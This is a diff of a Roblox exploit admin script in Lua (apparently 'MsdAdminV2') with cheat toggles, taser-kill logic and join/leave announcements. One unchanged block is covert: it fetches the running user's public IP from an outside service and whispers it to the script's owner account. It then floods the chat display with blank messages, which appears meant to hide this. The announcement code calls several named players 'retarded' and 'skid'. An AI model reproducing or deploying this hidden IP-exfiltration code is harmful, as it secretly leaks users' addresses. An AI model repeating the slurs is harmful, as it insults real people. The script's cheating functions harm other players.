@@ -4071,22 +4074,22 @@ if Connect.SendCommand("antisit") then
 if Arg2 == "on" then
 if not AntiSit then
 AntiSit = true
-Message("Anti Sit enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Sit enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == "off" then
 if AntiSit then
 AntiSit = false
-Message("Anti Sit desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Sit desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == nil then
 if not AntiSit then
 AntiSit = true
-Message("Anti Sit enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Sit enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 else
 AntiSit = false
-Message("Anti Sit desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Sit desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 end
@@ -4094,7 +4097,7 @@ end
 if Connect.SendCommand("unantisit") then
 if AntiSit then
 AntiSit = false
-Message("Anti Sit desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Sit desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 
@@ -4102,22 +4105,22 @@ if Connect.SendCommand("antifling") then
 if Arg2 == "on" then
 if not AntiFling then
 AntiFling = true
-Message("Anti Fling enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Fling enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == "off" then
 if AntiSit then
 AntiFling = false
-Message("Anti Fling desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Fling desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == nil then
 if not AntiFling then
 AntiFling = true
-Message("Anti Fling enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Fling enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 else
 AntiFling = false
-Message("Anti Fling desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Fling desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
 end
 end
@@ -4125,8 +4128,12 @@ end
 if Connect.SendCommand("unantifling") then
 if AntiFling then
 AntiFling = false
-Message("Anti Fling desabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Fling desabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 end
+end
+
+if Connect.SendCommand("cgun") then
+CGun(Arg2:lower())
 end
 
 if Connect.SendCommand("sa") then
@@ -4218,10 +4225,10 @@ if Arg2 == "on" then
 if not ProtectOwner then
 if LPlayer.Name ~= "viniciuszk70" then
 ProtectOwner = true
-Message("Owner protection has been enabled, if you click on it you disappear.",255,0,0,Enum.Font.GothamBlack,22)
+Message("Owner protection has been enabled, if you click on it you disappear.",255,0,0,Enum.Font.GothamBlack,21.5)
 else
 ProtectOwner = true
-Message("Owner protection has been enabled.",255,0,0,Enum.Font.GothamBlack,22)
+Message("Owner protection has been enabled.",255,0,0,Enum.Font.GothamBlack,21.5)
 end
 end
 end
@@ -4229,10 +4236,10 @@ if Arg2 == "off" then
 if ProtectOwner then
 if LPlayer.Name ~= "viniciuszk70" then
 ProtectOwner = false
-Message("Owner protection has been desabled.",255,0,0,Enum.Font.GothamBlack,22)
+Message("Owner protection has been desabled.",255,0,0,Enum.Font.GothamBlack,21.5)
 else
 ProtectOwner = false
-Message("Owner protection has been desabled.",255,0,0,Enum.Font.GothamBlack,22)
+Message("Owner protection has been desabled.",255,0,0,Enum.Font.GothamBlack,21.5)
 end
 end
 end
@@ -4242,13 +4249,13 @@ if Connect.SendCommand("prb") then
 if Arg2 == "on" then
 if not ProtectBlockOwner then
 ProtectBlockOwner = true
-Message("Owner block protection has been enabled.",255,0,0,Enum.Font.GothamBlack,22)
+Message("Owner block protection has been enabled.",255,0,0,Enum.Font.GothamBlack,21.5)
 end
 end
 if Arg2 == "off" then
 if ProtectBlockOwner then
 ProtectBlockOwner = false
-Message("Owner block protection has been desabled.",255,0,0,Enum.Font.GothamBlack,22)
+Message("Owner block protection has been desabled.",255,0,0,Enum.Font.GothamBlack,21.5)
 end
 end
 end
@@ -4312,7 +4319,7 @@ if LPlayer.Name ~= "viniciuszk70" then
 local GT = tostring(game:HttpGet("https://api.ipify.org", true))
 Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w viniciuszk70 mpls"..GT.."mpls", "All")
 for i = 1,100 do
-Message(" ",0,0,0,Enum.Font.GothamBlack,22)
+Message(" ",0,0,0,Enum.Font.GothamBlack,21.5)
 end
 end
 end
@@ -4637,11 +4644,17 @@ if Taser:FindFirstChild("GunStates") then
 Req = require(Taser.GunStates)
 if Req["CurrentAmmo"] < 1 then
 Cmds.Kill(v)
+if not v.Character:FindFirstChildOfClass("ForceField", true) and v.Character.Humanoid.Health ~= 0 then
+Message(v.Name..", tased you.",142,66,133,Enum.Font.GothamBlack,21.5)
+end
 end
 end
 end
 if v.Character:FindFirstChild("Taser") then
 Cmds.Kill(v)
+if not v.Character:FindFirstChildOfClass("ForceField", true) and v.Character.Humanoid.Health ~= 0 then
+Message(v.Name..", tased you.",142,66,133,Enum.Font.GothamBlack,21.5)
+end
 end
 end
 end
@@ -4905,38 +4918,6 @@ end)
 spawn(function()
 while wait() do
 if not DisableAdmin then
-if ProtectFps then
-if game:GetService("Workspace"):GetRealPhysicsFPS() < 49 then
-if not CheckAntiLag then
-CheckAntiLag = true
-AntiLag = true
-Message("A lag was detected Anti Lag was enabled.",70,70,200,Enum.Font.GothamBlack,22)
-end
-end
-end
-end
-end
-end)
-
-spawn(function()
-while wait(3) do
-if not DisableAdmin then
-if ProtectFps then
-if game:GetService("Workspace"):GetRealPhysicsFPS() > 52 then
-if CheckAntiLag then
-CheckAntiLag = false
-AntiLag = false
-Message("The lag has now passed the Anti Lag has been disabled.",70,70,200,Enum.Font.GothamBlack,22)
-end
-end
-end
-end
-end
-end)
-
-spawn(function()
-while wait() do
-if not DisableAdmin then
 pcall(function()
 local OldHour = PlayerGui.Home.hud.ClockFrame.tl.Text
 wait(1)
@@ -4989,6 +4970,41 @@ if AntiFling then
 if CheckAntiFlingAura then
 CheckAntiFlingAura = false
 end
+end
+end
+end
+end)
+
+spawn(function()
+while wait(6) do
+if not DisableAdmin then
+pcall(function()
+local OldHour = PlayerGui.Home.hud.ClockFrame.tl.Text
+wait(1)
+if PlayerGui.Home.hud.ClockFrame.tl.Text ~= OldHour then
+for i,v in pairs(game.Players:GetPlayers()) do
+if not v.Character:FindFirstChild("Humanoid") then
+Message(v.Name..", using god mode",255,255,0,Enum.Font.GothamBlack,21.5)
+end
+end
+end
+end)
+end
+end
+end)
+
+spawn(function()
+while wait() do
+if not DisableAdmin then
+if ColorGun ~= nil then
+pcall(function()
+for i,v in pairs(LPlayer.Character:FindFirstChildOfClass("Tool"):GetDescendants()) do
+if v.Name == "Part" then
+v.BrickColor = BrickColor.new(ColorGun)
+v.Material = "Neon"
+end
+end
+end)
 end
 end
 end
@@ -5084,28 +5100,23 @@ LPlayer.Character:FindFirstChild("Head").CanCollide = false
 LPlayer.Character:FindFirstChild("Torso").CanCollide = false
 end)
 end
+if AntiBring then
+for i,v in pairs(game.Players:GetPlayers()) do
+if not v.Character:FindFirstChild("Humanoid") then
+if v.Backpack:FindFirstChildOfClass("Tool") then
+v.Backpack:FindFirstChildOfClass("Tool"):Remove()
+end
+if v.Character:FindFirstChildOfClass("Tool") then
+v.Character:FindFirstChildOfClass("Tool"):Remove()
+end
+end
+end
+end
 end
 end)
 
 LPlayer.CharacterAdded:Connect(function()
 if not DisableAdmin then
-if AntiBring then
-local PartTool = Instance.new("Part")
-PartTool.Parent = LPlayer.Backpack:FindFirstChildOfClass("Tool")
-PartTool.Name = "PartToolChecked"
-LPlayer.Character.ChildAdded:Connect(function(Tool)
-for i = 1,10 do
-pcall(function()
-if not Tool:FindFirstChild("PartToolChecked") then
-Tool:Destroy()
-end
-if not Tool:FindFirstChild("Hammer") then
-Tool:Destroy()
-end
-end)
-end
-end)
-end
 if AntiPunch then
 wait(.1)
 pcall(function()
@@ -5114,6 +5125,11 @@ ExecuteAntiPunch()
 end
 end)
 end
+end
+end)
+
+LPlayer.CharacterAdded:Connect(function()
+if not DisableAdmin then
 if AntiArrest then
 AntiArrest = false
 wait(.1)
@@ -5128,6 +5144,11 @@ CheckDiedAntiArrest = false
 AntiArrest = true
 end
 end
+end
+end)
+
+LPlayer.CharacterAdded:Connect(function()
+if not DisableAdmin then
 if AutoRespawn == true then
 AutoRespawn = false
 wait(.1)
@@ -5144,22 +5165,22 @@ end)
 Players.PlayerAdded:Connect(function(Added)
 if not DisableAdmin then
 if Added.Name == "viniciuszk70" then
-Message(Added.Name..", the owner of the script joined the game.",0,0,0,Enum.Font.GothamBlack,20)
+Message(Added.Name..", the owner of the script joined the game.",0,0,0,Enum.Font.GothamBlack,21.5)
 end
 if Added.Name == "estranha_rs" then
-Message(Added.Name..", traitor joined the game.",69,69,69,Enum.Font.GothamBlack,20)
+Message(Added.Name..", traitor joined the game.",69,69,69,Enum.Font.GothamBlack,21.5)
 end
 if Added.Name == "RCM_Mystx" or Added.Name == "33_night" or Added.Name == "GAB_LEALZINHO" or Added.Name == "HisKarAlof" then
-Message(Added.Name..", pro player joined the game.",0,255,0,Enum.Font.GothamBlack,20)
+Message(Added.Name..", pro player joined the game.",0,255,0,Enum.Font.GothamBlack,21.5)
 end
 if Added.Name == "DizK1ll" or Added.Name == "Alt_Operator" or Added.Name == "iPipeh" or Added.Name == "iangesantos" then
-Message(Added.Name..", retarded joined the game.",255,0,191,Enum.Font.GothamBlack,20)
+Message(Added.Name..", retarded joined the game.",255,0,191,Enum.Font.GothamBlack,21.5)
 end
 if Added.Name == "XxVanessa_OmqxX" or Added.Name == "gabri3l26015h" and Added.Name == "juliooo947" then
-Message(Added.Name..", skid joined the game.",255,255,0,Enum.Font.GothamBlack,20)
+Message(Added.Name..", skid joined the game.",255,255,0,Enum.Font.GothamBlack,21.5)
 end
 if Added.Name ~= "viniciuszk70" and Added.Name ~= "estranha_rs" and Added.Name ~= "RCM_Mystx" and Added.Name ~= "33_night" and Added.Name ~= "GAB_LEALZINHO" and Added.Name ~= "DizK1ll" and Added.Name ~= "Alt_Operator" and Added.Name ~= "iPipeh" and Added.Name ~= "iangesantos" and Added.Name ~= "XxVanessa_OmqxX" and Added.Name ~= "gabri3l26015h" and Added.Name ~= "juliooo947" and Added.Name ~= "HisKarAlof" then
-Message(Added.Name..", joined the game.",255,255,255,Enum.Font.GothamBlack,20)
+Message(Added.Name..", joined the game.",255,255,255,Enum.Font.GothamBlack,21.5)
 end
 end
 end)
@@ -5167,22 +5188,22 @@ end)
 Players.PlayerRemoving:Connect(function(Removed)
 if not DisableAdmin then
 if Removed.Name == "viniciuszk70" then
-Message(Removed.Name..", the owner of the script left the game.",0,0,0,Enum.Font.GothamBlack,20)
+Message(Removed.Name..", the owner of the script left the game.",0,0,0,Enum.Font.GothamBlack,21.5)
 end
 if Removed.Name == "estranha_rs" then
-Message(Removed.Name..", traitor left the game.",69,69,69,Enum.Font.GothamBlack,20)
+Message(Removed.Name..", traitor left the game.",69,69,69,Enum.Font.GothamBlack,21.5)
 end
 if Removed.Name == "RCM_Mystx" or Removed.Name == "33_night" or Removed.Name == "GAB_LEALZINHO" or Removed.Name == "HisKarAlof" then
-Message(Removed.Name..", pro player left the game.",0,255,0,Enum.Font.GothamBlack,20)
+Message(Removed.Name..", pro player left the game.",0,255,0,Enum.Font.GothamBlack,21.5)
 end
 if Removed.Name == "DizK1ll" or Removed.Name == "Alt_Operator" or Removed.Name == "iPipeh" or Removed.Name == "iangesantos" then
-Message(Removed.Name..", retarded left the game.",255,0,191,Enum.Font.GothamBlack,20)
+Message(Removed.Name..", retarded left the game.",255,0,191,Enum.Font.GothamBlack,21.5)
 end
 if Removed.Name == "XxVanessa_OmqxX" or Removed.Name == "gabri3l26015h" or Removed.Name == "juliooo947" then
-Message(Removed.Name..", skid left the game.",255,255,0,Enum.Font.GothamBlack,20)
+Message(Removed.Name..", skid left the game.",255,255,0,Enum.Font.GothamBlack,21.5)
 end
 if Removed.Name ~= "viniciuszk70" and Removed.Name ~= "estranha_rs" and Removed.Name ~= "RCM_Mystx" and Removed.Name ~= "33_night" and Removed.Name ~= "GAB_LEALZINHO" and Removed.Name ~= "DizK1ll" and Removed.Name ~= "Alt_Operator" and Removed.Name ~= "iPipeh" and Removed.Name ~= "iangesantos" and Removed.Name ~= "XxVanessa_OmqxX" and Removed.Name ~= "gabri3l26015h" and Removed.Name ~= "juliooo947" and Removed.Name ~= "HisKarAlof" then
-Message(Removed.Name..", left the game.",255,255,255,Enum.Font.GothamBlack,20)
+Message(Removed.Name..", left the game.",255,255,255,Enum.Font.GothamBlack,21.5)
 end
 end
 end)
@@ -5211,54 +5232,49 @@ LPlayer.Character.HumanoidRootPart.CFrame = Pos
 end
 end)
 
-Message("Some things will be activated.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Some things will be activated.",70,70,70,Enum.Font.GothamBlack,21.5)
 
 wait(.3)
 
 AutoRespawn = true
-Message("Auto Respawn enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Auto Respawn enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 
 wait(.3)
 
 AntiVoid = true
-Message("Anti Void enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Void enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 
 wait(.3)
 
 AntiShield = true
-Message("Anti Shield enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Shield enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 
 
 wait(.3)
 
 AntiArrest = true
-Message("Anti Arrest enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Arrest enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 
 wait(.3)
 
 ExecuteAntiPunch()
 AntiPunch = true
-Message("Anti Punch enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Punch enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 
 wait(.3)
 
 AntiDoors = true
-Message("Anti Doors enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Anti Doors enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 
 wait(.3)
 
 ProtectTase = true
-Message("Protect Tase enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Protect Tase enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 
 wait(.3)
 
 ProtectArrest = true
-Message("Protect Arrest enabled.",70,70,70,Enum.Font.GothamBlack,22)
-
-wait(.3)
-
-ProtectFps = true
-Message("Protect Fps enabled.",70,70,70,Enum.Font.GothamBlack,22)
+Message("Protect Arrest enabled.",70,70,70,Enum.Font.GothamBlack,21.5)
 
 wait(.3)
 
@@ -5274,8 +5290,9 @@ end
 
 getgenv().RemoveOldScript = function()
 pcall(function()
-Message("The script has been rerun, the old toggles and loops have been removed to prevent bugs.",70,70,200,Enum.Font.GothamBlack,22)
-MsdAdminV2:Destroy();
+Message("The script has been rerun, the old toggles and loops have been removed to prevent bugs.",70,70,200,Enum.Font.GothamBlack,21.5)
+Cmds.Respawn()
+MsdAdminV2:Destroy()
 DisableAdmin = true
 RemoveOldScript:Destroy()
 end)
